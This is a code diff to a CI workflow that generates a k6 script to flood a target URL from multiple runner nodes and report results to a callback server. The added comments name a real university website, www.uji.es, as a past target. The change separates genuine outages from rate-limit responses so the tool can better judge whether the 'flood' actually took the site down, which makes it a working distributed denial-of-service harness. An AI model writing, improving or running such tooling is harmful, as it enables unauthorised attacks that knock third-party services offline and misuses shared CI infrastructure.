@@ -40,6 +40,16 @@ jobs:
         run: |
           cat > loadtest.js << 'K6EOF'
           import http from 'k6/http';
+          import { Counter } from 'k6/metrics';
+          // k6's built-in http_req_failed lumps a 429/403 from a WAF or CDN
+          // rate-limiter in with a genuine connection failure or 500 from
+          // the target -- both just count as "failed". That conflation
+          // produced a false "target achieved" report against www.uji.es:
+          // the site was returning 4xx to the flood (defending itself, not
+          // down), but the blanket error rate crossed the threshold anyway.
+          const networkErrors = new Counter('network_errors');
+          const serverErrors = new Counter('server_errors');
+          const clientErrors = new Counter('client_errors');
           export const options = {
             discardResponseBodies: true,
             scenarios: {
@@ -55,14 +65,23 @@ jobs:
             },
           };
           export default function () {
-            http.get(__ENV.TARGET_URL);
+            const res = http.get(__ENV.TARGET_URL);
+            if (res.status === 0) networkErrors.add(1);
+            else if (res.status >= 500) serverErrors.add(1);
+            else if (res.status >= 400) clientErrors.add(1);
           }
           export function handleSummary(data) {
+            const total = data.metrics.http_reqs ? data.metrics.http_reqs.values.count : 0;
+            const netErr = data.metrics.network_errors ? data.metrics.network_errors.values.count : 0;
+            const srvErr = data.metrics.server_errors ? data.metrics.server_errors.values.count : 0;
+            const cliErr = data.metrics.client_errors ? data.metrics.client_errors.values.count : 0;
             const summary = {
-              totalRequests: data.metrics.http_reqs ? data.metrics.http_reqs.values.count : 0,
+              totalRequests: total,
               avgMs: data.metrics.http_req_duration ? data.metrics.http_req_duration.values.avg : null,
               p95Ms: data.metrics.http_req_duration ? data.metrics.http_req_duration.values['p(95)'] : null,
               errorRatePct: data.metrics.http_req_failed ? data.metrics.http_req_failed.values.rate * 100 : 0,
+              realFailureRatePct: total > 0 ? ((netErr + srvErr) / total) * 100 : 0,
+              rateLimitedPct: total > 0 ? (cliErr / total) * 100 : 0,
             };
             return { '/tmp/summary.json': JSON.stringify(summary), stdout: JSON.stringify(summary) };
           }
@@ -86,3 +105,4 @@ jobs:
           SUMMARY=$(cat /tmp/summary.json 2>/dev/null || echo '{}')
           PAYLOAD=$(jq -n --arg runId "$RUN_ID" --argjson nodeIndex "$NODE_INDEX" --arg ip "$REPORTED_IP" --argjson summary "$SUMMARY" '{runId:$runId, nodeIndex:$nodeIndex, reportedIp:$ip, summary:$summary}')
           curl -s -X POST "$CALLBACK_URL" -H "Content-Type: application/json" -H "X-Callback-Secret: $CALLBACK_SECRET" -d "$PAYLOAD"
+
